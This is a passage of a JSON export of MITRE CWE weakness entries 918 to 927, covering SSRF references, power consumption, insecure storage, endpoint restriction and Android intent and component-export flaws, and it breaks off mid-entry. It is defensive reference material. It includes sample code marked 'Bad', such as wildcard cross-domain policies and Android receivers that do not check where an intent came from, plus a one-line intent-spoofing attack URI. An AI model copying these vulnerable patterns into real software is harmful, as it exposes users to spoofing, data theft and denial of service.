          "URL": "https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-3/"
        },
        {
          "ExternalReferenceID": "REF-918",
          "Authors": [
            "Vladimir Vorontsov",
            "Alexander Golovko"
          ],
          "Title": "SSRF attacks and sockets: smorgasbord of vulnerabilities",
          "URL": "https://www.slideshare.net/DefconRussia/vorontsov-golovko-ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-919",
          "Authors": [
            "ONsec Lab"
          ],
          "Title": "SSRF bible. Cheatsheet",
          "PublicationYear": "2013",
          "PublicationMonth": "01",
          "PublicationDay": "26",
          "URL": "https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#"
        },
        {
          "ExternalReferenceID": "REF-920",
          "Authors": [
            "Deral Heiland"
          ],
          "Title": "Web Portals: Gateway To Information, Or A Hole In Our Perimeter Defenses",
          "PublicationYear": "2008",
          "PublicationMonth": "02",
          "URL": "http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the \"Server\" portion of the SSRF acronym does not necessarily apply."
        }
      ]
    },
    {
      "ID": "920",
      "Name": "Improper Restriction of Power Consumption",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product operates in an environment in which power is a limited resource that cannot be automatically replenished, but the product does not properly restrict the amount of power that its operation consumes.",
      "ExtendedDescription": "\n\nIn environments such as embedded or mobile devices, power can be a limited resource such as a battery, which cannot be automatically replenished by the product itself, and the device might not always be directly attached to a reliable power source. If the product uses too much power too quickly, then this could cause the device (and subsequently, the product) to stop functioning until power is restored, or increase the financial burden on the device owner because of increased power costs.\n\n\nNormal operation of an application will consume power. However, in some cases, an attacker could cause the application to consume more power than intended, using components such as:\n\n\n  - Display\n\n  - CPU\n\n  - Disk I/O\n\n  - GPS\n\n  - Sound\n\n  - Microphone\n\n  - USB interface\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "The power source could be drained, causing the application - and the entire device - to cease functioning."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 6.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 6.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-4"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "921",
      "Name": "Storage of Sensitive Data in a Mechanism without Access Control",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product stores sensitive information in a file system or device that does not have built-in access control.",
      "ExtendedDescription": "\n\nWhile many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.\n\n\nOn Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "922",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "Attackers can read sensitive information by accessing the unrestricted storage mechanism."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data",
            "Modify Files or Directories"
          ],
          "Note": "Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism."
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-921",
          "Authors": [
            "Android Open Source Project"
          ],
          "Title": "Security Tips",
          "PublicationYear": "2013",
          "PublicationMonth": "07",
          "PublicationDay": "16",
          "URL": "https://developer.android.com/training/articles/security-tips.html#StoringData",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "922",
      "Name": "Insecure Storage of Sensitive Information",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product stores sensitive information without properly limiting read or write access by unauthorized actors.",
      "ExtendedDescription": "If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "System Configuration"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "Attackers can read sensitive information by accessing the unrestricted storage mechanism."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data",
            "Modify Files or Directories"
          ],
          "Note": "Attackers can overwrite sensitive information by accessing the unrestricted storage mechanism."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-2272",
          "Description": "password and username stored in cleartext in a cookie",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2272"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data. While data tampering would be visible upon inspection, the integrity and availability of the data is compromised prior to the audit."
        },
        {
          "Type": "Maintenance",
          "Note": "This is a high-level entry that includes children from various parts of the CWE research view (CWE-1000). Currently, most of the information is in these child entries. This entry will be made more comprehensive in later CWE versions."
        }
      ]
    },
    {
      "ID": "923",
      "Name": "Improper Restriction of Communication Channel to Intended Endpoints",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.",
      "ExtendedDescription": "\n\nAttackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.\n\n\nWhile this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "284",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-208",
          "Entries": [
            {
              "IntroText": "These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:"
            },
            {
              "BodyText": "Flash crossdomain.xml :"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\">\n\t<allow-access-from domain=\"*.example.com\"/>\n\t<allow-access-from domain=\"*\"/>\n\t</cross-domain-policy>\n```"
            },
            {
              "BodyText": "Silverlight clientaccesspolicy.xml :"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<access-policy>\n\t<cross-domain-access>\n\t<policy>\n\t<allow-from http-request-headers=\"SOAPAction\">\n\t<domain uri=\"*\"/>\n\t</allow-from>\n\t<grant-to>\n\t<resource path=\"/\" include-subpaths=\"true\"/>\n\t</grant-to>\n\t</policy>\n\t</cross-domain-access>\n\t</access-policy>\n```"
            },
            {
              "BodyText": "These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."
            }
          ]
        },
        {
          "ID": "DX-112",
          "Entries": [
            {
              "IntroText": "This Android application will remove a user account when it receives an intent to do so:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n\tpublic class DeleteReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tint userID = intent.getIntExtra(\"userID\");\n\t\t\tdestroyUserData(userID);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-30319",
          "Description": "S-bus functionality in a home automation product performs access control using an IP allowlist, which can be bypassed by a forged IP address.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30319"
        },
        {
          "Reference": "CVE-2022-22547",
          "Description": "A troubleshooting tool exposes a web server on a random port between 9000-65535 that could be used for information gathering",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-22547"
        },
        {
          "Reference": "CVE-2022-4390",
          "Description": "A WAN interface on a router has firewall restrictions enabled for IPv4, but it does not for IPv6, which is enabled by default",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4390"
        },
        {
          "Reference": "CVE-2012-2292",
          "Description": "Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2292"
        },
        {
          "Reference": "CVE-2012-5810",
          "Description": "Mobile banking application does not verify hostname, leading to financial loss.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-5810"
        },
        {
          "Reference": "CVE-2014-1266",
          "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversry-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"
        },
        {
          "Reference": "CVE-2000-1218",
          "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1218"
        }
      ],
      "RelatedAttackPatterns": [
        "161",
        "481",
        "501",
        "697"
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "924",
      "Name": "Improper Enforcement of Message Integrity During Transmission in a Communication Channel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.",
      "ExtendedDescription": "Attackers might be able to modify the message and spoof the endpoint by interfering with the data as it crosses the network or by redirecting the connection to a system under their control.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry should be made more comprehensive in later CWE versions, as it is likely an important design flaw that underlies (or chains to) other weaknesses."
        }
      ]
    },
    {
      "ID": "925",
      "Name": "Improper Verification of Intent by Broadcast Receiver",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source.",
      "ExtendedDescription": "Certain types of Intents, identified by action string, can only be broadcast by the operating system itself, not by third-party applications. However, when an application registers to receive these implicit system intents, it is also registered to receive any explicit intents. While a malicious application cannot send an implicit system intent, it can send an explicit intent to the target application, which may assume that any received intent is a valid implicit system intent and not an explicit intent from another application. This may lead to unintended behavior.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "940",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Intent Spoofing"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "Another application can impersonate the operating system and cause the software to perform an unintended action."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Before acting on the Intent, check the Intent Action to make sure it matches the expected System action."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<manifest package=\"com.example.vulnerableApplication\">\n\t\t\t<application>\n```\n...* \n\t\t\t\n\t\t\t```\n\t\t\t\t\t<receiver android:name=\".ShutdownReceiver\">\n\t\t\t\t\t\t<intent-filter>\n\t\t\t\t\t\t\t<action android:name=\"android.intent.action.ACTION_SHUTDOWN\" />\n\t\t\t\t\t\t</intent-filter>\n\t\t\t\t\t</receiver>\n```\n...* \n\t\t\t\n\t\t\t</application></manifest>"
            },
            {
              "BodyText": "The ShutdownReceiver class will handle the intent:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n...* \n\tIntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN);\n\tBroadcastReceiver sReceiver = new ShutDownReceiver();\n\tregisterReceiver(sReceiver, filter);\n\t\n\t *...* \n\t\n\tpublic class ShutdownReceiver extends BroadcastReceiver {\n\t```\n\t\t@Override\n\t\tpublic void onReceive(final Context context, final Intent intent) {\n\t\t\tmainActivity.saveLocalData();\n\t\t\tmainActivity.stopActivity();\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Because the method does not confirm that the intent action is the expected system intent, any received intent will trigger the shutdown procedure, as shown here:"
            },
            {
              "Nature": "Attack",
              "Language": "Java",
              "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"
            },
            {
              "BodyText": "An attacker can use this behavior to cause a denial of service."
            }
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "499"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-922",
          "Section": "3.2.1",
          "Authors": [
            "Erika Chin",
            "Adrienne Porter Felt",
            "Kate Greenwood",
            "David Wagner"
          ],
          "Title": "Analyzing Inter-Application Communication in Android",
          "URL": "http://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry will be made more comprehensive in later CWE versions."
        }
      ]
    },
    {
      "ID": "926",
      "Name": "Improper Export of Android Application Components",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The Android application exports a component for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains.",
      "ExtendedDescription": "\n\nThe attacks and consequences of improperly exporting a component may depend on the exported component:\n\n\n  - If access to an exported Activity is not restricted, any application will be able to launch the activity. This may allow a malicious application to gain access to sensitive information, modify the internal state of the application, or trick a user into interacting with the victim application while believing they are still interacting with the malicious application.\n\n  - If access to an exported Service is not restricted, any application may start and bind to the Service. Depending on the exposed functionality, this may allow a malicious application to perform unauthorized actions, gain access to sensitive information, or corrupt the internal state of the application.\n\n  - If access to a Content Provider is not restricted to only the expected applications, then malicious applications might be able to access the sensitive data. Note that in Android before 4.2, the Content Provider is automatically exported unless it has been explicitly declared as NOT exported.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "\n\nThere are three types of components that can be exported in an Android application.\n\n\n  - An Activity is an application component that provides a UI for users to interact with. A typical application will have multiple Activity screens that perform different functions, such as a main Activity screen and a separate settings Activity screen.\n\n  - A Service is an application component that is started by another component to execute an operation in the background, even after the invoking component is terminated. Services do not have a UI component visible to the user.\n\n  - The Content Provider mechanism can be used to share data with other applications or internally within the same application.\n\n"
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "Unexpected State",
            "DoS: Crash, Exit, or Restart",
            "DoS: Instability",
            "Varies by Context"
          ],
          "Note": "Other applications, possibly untrusted, can launch the Activity."
        },
        {
          "Scope": [
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "Unexpected State",
            "Gain Privileges or Assume Identity",
            "DoS: Crash, Exit, or Restart",
            "DoS: Instability",
            "Varies by Context"
          ],
          "Note": "Other applications, possibly untrusted, can bind to the Service."
        },
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ],
          "Note": "Other applications, possibly untrusted, can read or modify the data that is offered by the Content Provider."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "If they do not need to be shared by other applications, explicitly mark components with android:exported=\"false\" in the application manifest."
        },
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "If you only intend to use exported components between related apps under your control, use android:protectionLevel=\"signature\" in the xml manifest to restrict access to applications signed by you."
        },
        {
          "Phase": [
            "Build and Compilation",
            "Architecture and Design"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "Limit Content Provider permissions (read/write) as appropriate."
        },
        {
          "Phase": [
            "Build and Compilation",
            "Architecture and Design"
          ],
          "Strategy": "Separation of Privilege",
          "Description": "Limit Content Provider permissions (read/write) as appropriate."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This application is exporting an activity and a service in its manifest.xml:"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<activity android:name=\"com.example.vulnerableApp.mainScreen\">\n```\n...* \n\t\t\t<intent-filter>\n\t\t\t```\n\t\t\t\t<action android:name=\"com.example.vulnerableApp.OPEN_UI\" />\n\t\t\t\t<category android:name=\"android.intent.category.DEFAULT\" />\n\t\t\t</intent-filter>\n```\n...* \n\t\t\t</activity>\n\t<service android:name=\"com.example.vulnerableApp.backgroundService\">\n\t```\n```\n...* \n\t\t\t<intent-filter>\n\t\t\t```\n\t\t\t\t<action android:name=\"com.example.vulnerableApp.START_BACKGROUND\" />\n\t\t\t</intent-filter>\n```\n...* \n\t\t\t</service>"
            },
            {
              "BodyText": "Because these components have intent filters but have not explicitly set 'android:exported=false' elsewhere in the manifest, they are automatically exported so that any other application can launch them. This may lead to unintended behavior or exploits."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This application has created a content provider to enable custom search suggestions within the application:"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<provider>\n\t\tandroid:name=\"com.example.vulnerableApp.searchDB\"\n\t\tandroid:authorities=\"com.example.vulnerableApp.searchDB\">\n\t</provider>\n```"
            },
            {
              "BodyText": "Because this content provider is only intended to be used within the application, it does not need to be exported. However, in Android before 4.2, it is automatically exported thus potentially allowing malicious applications to access sensitive information."
            }
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-923",
          "Authors": [
            "Android Open Source Project"
          ],
          "Title": "Security Tips",
          "PublicationYear": "2013",
          "PublicationMonth": "07",
          "PublicationDay": "16",
          "URL": "https://developer.android.com/training/articles/security-tips#ContentProviders",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "927",
      "Name": "Use of Implicit Intent for Sensitive Communication",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The Android application uses an implicit intent for transmitting sensitive data to other applications.",
      "ExtendedDescription": "\n\nSince an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent Filter for that intent. This can allow untrusted applications to obtain sensitive data. There are two variations on the standard broadcast intent, ordered and sticky.\n\n\nOrdered broadcast intents are delivered to a series of registered receivers in order of priority as declared by the Receivers. A malicious receiver can give itself a high priority and cause a denial of service by stopping the broadcast from propagating further down the chain. There is also the possibility of malicious data modification, as a receiver may also alter the data within the Intent before passing it on to the next receiver. The downstream components have no way of asserting that the data has not been altered earlier in the chain.\n\n\nSticky broadcast intents remain accessible after the initial broadcast. An old sticky intent will be broadcast again to any new receivers that register for it in the future, greatly increasing the chances of information exposure over time. Also, sticky broadcasts cannot be protected by permissions that may apply to other kinds of intents.\n\n\nIn addition, any broadcast intent may include a URI that references data that the receiving component does not normally have the privileges to access. The sender of the intent can include special privileges that grant the receiver read or write access to the specific URI included in the intent. A malicious receiver that intercepts this intent will also gain those privileges and be able to read or write the resource at the specified URI.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Other applications, possibly untrusted, can read the data that is offered through the Intent."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "The application may handle responses from untrusted applications on the device, which could cause it to perform unexpected or unauthorized actions."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
